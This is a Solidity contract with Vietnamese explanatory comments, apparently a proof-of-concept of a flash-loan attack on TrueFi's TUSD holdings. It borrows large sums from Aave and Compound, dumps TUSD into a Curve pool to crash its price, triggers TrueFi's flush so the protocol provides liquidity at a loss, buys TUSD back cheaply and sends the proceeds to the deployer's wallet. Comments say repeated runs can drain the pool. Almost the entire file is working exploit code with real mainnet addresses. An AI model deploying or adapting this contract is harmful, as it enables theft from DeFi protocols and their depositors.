pragma solidity ^0.6.6;

import "./ComptrollerInterface.sol";
import "./CTokenInterface.sol";

import {FlashLoanReceiverBase} from "./aave/FlashLoanReceiverBase.sol";
import {ILendingPool, ILendingPoolAddressesProvider, IERC20} from "./aave/Interfaces.sol";
import {SafeERC20, SafeMath} from "./aave/Libraries.sol";

import "hardhat/console.sol";

interface ILendingPoolCore {
    function getReserveAvailableLiquidity(address _reserve)
        external
        view
        returns (uint256);
}

interface TrueFi {
    function currencyBalance() external view returns (uint256);

    function flush(uint256 currencyAmount, uint256 minMintAmount) external;

    function join(uint256 amount) external;
}

interface CrvSwap {
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 minAmount
    ) external;

    function get_dx_underlying(
        int128 i,
        int128 j,
        uint256 dx
    ) external returns (uint256);
}

interface IYearn {
    function balance() external view returns (uint256);

    function supplyAave(uint amount) external;
}

contract Flashloan is FlashLoanReceiverBase {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;
    uint256 public totalAmount;
    uint256 public maximumTUSD;
    IERC20 TUSD;
    IERC20 DAI;
    CTokenInterface CTUSD;
    CTokenInterface CDAI;
    ComptrollerInterface Comptroller;
    address adv;

    constructor()
        public
        FlashLoanReceiverBase(
            ILendingPoolAddressesProvider(
                0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5
            )
        )
    {
        adv = msg.sender; // addres ví của hackers

        // Thiết lập các địa chỉ chính xác cho các loại tài sản
        DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        TUSD = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
        CTUSD = CTokenInterface(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
        CDAI = CTokenInterface(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
        Comptroller = ComptrollerInterface(
            0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
        );

        address[] memory assets = new address[](1);
        assets[0] = address(CDAI);
        Comptroller.enterMarkets(assets);
    }

    function flashloan() public {
        require(msg.sender == adv);
        // borrow from aaveV2
        console.log("Bắt đầu");
        startFlashLoan();
        console.log("TUSD còn tại cuối cùng là", TUSD.balanceOf(address(this)));
    }

    function startFlashLoan() internal {
        // get total liquidity
        address[] memory assets = new address[](2);

        // Chỉ định các loại tài sản muốn vay
        assets[0] = address(TUSD);
        assets[1] = address(DAI);

        // Số lượng tài sản muốn với đối với từng loại
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = TUSD.balanceOf(0x101cc05f4A51C0319f570d5E146a8C625198e636); // kiểm tra trong pool TUSD có bao nhiêu sẽ vay hết
        amounts[1] = 80000000 ether; // chỉ định muốn vay 80 triệu DAI

        // Thiết lập mode vay trực tiếp hay gián tiếp
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        LENDING_POOL.flashLoan(
            address(this), // - receiverAddress:    Địa chỉ nhận assets
            assets, // - assets:             Các loại tài sản muốn vay
            amounts, // - amounts:            Số lượng vay của từng tài sản
            modes, // - modes:              Chế độ vay của từng tài sản
            address(this), // - onBehalfOf:         Người chịu khoản nợ
            "", // - params:             Các tham số sđược mã hóa dạng bytes-encoded để truyền vào thực thi trong hàm executeOperation() nếu có
            0 // - referralCode:       Mã giới thiệu thường sử dụng cho bên thứ 3 nếu có
        );
    }

    /**
     *  Function này sẽ được gọi lại từ lendingpool sau khi khoản vay đã được chuyển về receiverAddress
     */
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        console.log("Đã nhận các tài sản vay Aave");
        // Gửi DAI vào Compound Finance để lấy toàn bộ TUSD đang có sẵn về
        borrowFromCompound();
        maximumTUSD = TUSD.balanceOf(address(this));
        console.log("Tổng số TUSD nhận được ->", maximumTUSD);

        exploit(premiums[1] + 1 ether); // Truyền vào lượng phí DAI cần trả cho khoản vay DAI trên Aave là 0.09%
        console.log(
            "Tổng TUSD sau khai thác ->",
            TUSD.balanceOf(address(this))
        );

        repayToCompound();
        // Approve cho LendingPool của Aave để đến cuối transaction LendingPool sẽ tự kéo các tài sản và phí về
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).safeApprove(address(LENDING_POOL), amountOwing);
        }
        return true;
    }

    function borrowFromCompound() internal {
        // TUSD compound address - CTUSD = 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86
        uint256 daiAmount = DAI.balanceOf(address(this)); // Balance đang có 80 triệu DAI
        console.log("Số lượng DAI hiện có sau khi vay từ Aave ->", daiAmount);
        uint256 borrowAmount = CTUSD.getCash(); // Kiểm trả xem pool Compound có bao nhiêu TUSD
        DAI.safeApprove(address(CDAI), daiAmount);
        CDAI.mint(daiAmount); // Gửi DAI vào pool Compound để nhận về cDAI bảo chứng cho khoản tiền gửi
        CTUSD.borrow(borrowAmount); // Vay toàn bộ lượng TUSD đang có trong pool Compound
        console.log("Số lượng TUSD đã vay được từ Compound ->", borrowAmount);
    }

    function repayToCompound() internal {
        uint256 repayAmount = CTUSD.borrowBalanceCurrent(address(this)); // Kiểm tra khoản nợ cần thanh toán
        TUSD.approve(address(CTUSD), repayAmount);
        CTUSD.repayBorrow(repayAmount); // Thanh toán khoản vay TUSD trên Compound Finance
        uint256 cdaiAmount = CDAI.balanceOf(address(this));
        CDAI.approve(address(CDAI), cdaiAmount);
        CDAI.redeem(cdaiAmount); // Tiến hành rút DAI khỏi Compound để thanh toán khoán vay Flash Loan trên Aave
    }

    function exploit(uint256 daiPremium) internal {
        CrvSwap swap = CrvSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
        TrueFi trueFi = TrueFi(0xa1e72267084192Db7387c8CC1328fadE470e4149);
        uint256 totalAmount = TUSD.balanceOf(address(this));
        uint256 swap_amount = 18000000 ether;

        IERC20 tether = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        TUSD.approve(address(swap), totalAmount);

        console.log(
            "Giá TUSD/DAI trước thao túng ->",
            swap.get_dx_underlying(0, 3, 1 ether)
        );

        // ***************** Thao Túng giá TUSD **************

        // 1. Bán 18 triệu TUSD (coins[3]) để thu về DAI (coins[0])
        swap.exchange_underlying(3, 0, swap_amount, 0);

        // 2. Bán 18 triệu TUSD (coins[3]) để thu về USDC (coins[1])
        swap.exchange_underlying(3, 1, swap_amount, 0);

        // 3. Bán toàn bộ TUSD (coins[3]) còn lại để thu về USDT (coins[2])
        uint256 leftAmount = TUSD.balanceOf(address(this));
        swap.exchange_underlying(3, 2, leftAmount, 0);

        /**
         * Hackers đang đẩy một số lượng lớn TUSD vào pool
         * => Lượng TUSD nhiều các token khác thì ít đi
         *  => Giá của TUSD bị giảm sâu
         *
         * Lúc này nếu cung cấp thanh khoản sẽ gây ra một sự
         * impermanent loss rất lớn khi tỷ giá của TUSD được
         * cân bằng trở lại
         */

        console.log(
            "Giá TUSD/DAI sau thao túng ->",
            swap.get_dx_underlying(0, 3, 1 ether)
        );

        // 4. Get số lượng TUSD đang được gửi trong trueFi
        uint256 trueFiAmount = trueFi.currencyBalance();

        // 5. Tiến hành đẩy toàn bộ TUSD hiện đang có đi
        //    cung cấp thanh khảo cho pool Curve Finance
        trueFi.flush(trueFiAmount, 0);

        // 6. Sử dụng toàn bộ DAI (coins[0]) đang có
        //    bớt lại 1 khoản để trả phí (daiPremium)
        //    cho Aave Flash Loan. Còn lại bao nhiêu DAI
        //    được sử dụng để mua lại TUSD (coins[3]) giá thấp
        uint256 dai_amount = dai.balanceOf(address(this));
        dai.approve(address(swap), dai_amount);
        swap.exchange_underlying(0, 3, dai_amount - daiPremium, 0);

        // 7. Sử dụng toàn bộ lượng USDC (coins[1]) đang có
        //    mua lại TUSD (coins[3]) giá thấp
        uint256 usdc_amount = usdc.balanceOf(address(this));
        usdc.safeApprove(address(swap), usdc_amount);
        swap.exchange_underlying(1, 3, usdc_amount, 0);

        // 8. Sử dụng toàn bộ lượng USDT (coins[2]) đang có
        //    mua lại TUSD (coins[3]) giá thấp
        uint256 tether_amount = tether.balanceOf(address(this));
        tether.safeApprove(address(swap), tether_amount);
        swap.exchange_underlying(2, 3, tether_amount, 0);

        console.log(
            "Giá TUSD/DAI sau khi được cân bằng ->",
            swap.get_dx_underlying(0, 3, 1 ether)
        );

        /**
         * => Cứ như vậy giá thì đã được cân bằng trở lại
         * nhưng hackers đã thu được rất nhiều TUSD do mua
         * được giá thấp hơn thông thường. Hay đó chính là
         * khoản impermanent loss mà TrueFi đã phải cung cấp
         * khi tỷ giá của TUSD bị thấp hơn rất nhiều só với
         * các tài sản DAI, USDC, USDT
         *
         * => Theo tính toán thì mỗi 1 exploit như thế này sẽ
         * có thể thu được 14.3 gần 15 triệu TUSD. Do vậy hackers
         * chỉ cần cho contract thực hiện lại vào transaction
         * như thế này là có thể hút cạn tiền trong pool TUSD
         * của TrueFi
         */
    }

    /**
     * Hàm để rút tất cả TUSD đã exploit được về ví cá nhân của hackers
     */
    function withdrawAll() public {
        require(msg.sender == adv);
        uint256 totalAmount = TUSD.balanceOf(address(this));
        TUSD.safeTransfer(adv, totalAmount);
    }
}
